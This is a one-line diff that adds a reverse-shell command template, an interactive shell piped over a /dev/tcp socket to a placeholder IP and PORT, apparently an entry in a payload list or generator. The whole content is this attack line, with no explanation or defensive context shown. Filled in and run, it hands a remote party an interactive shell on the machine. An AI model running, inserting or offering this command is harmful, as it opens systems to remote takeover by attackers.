@@ -1,0 +1,1 @@
+SHELL -i 5<> /dev/tcp/IP/PORT 0<&5 1>&5 2>&5
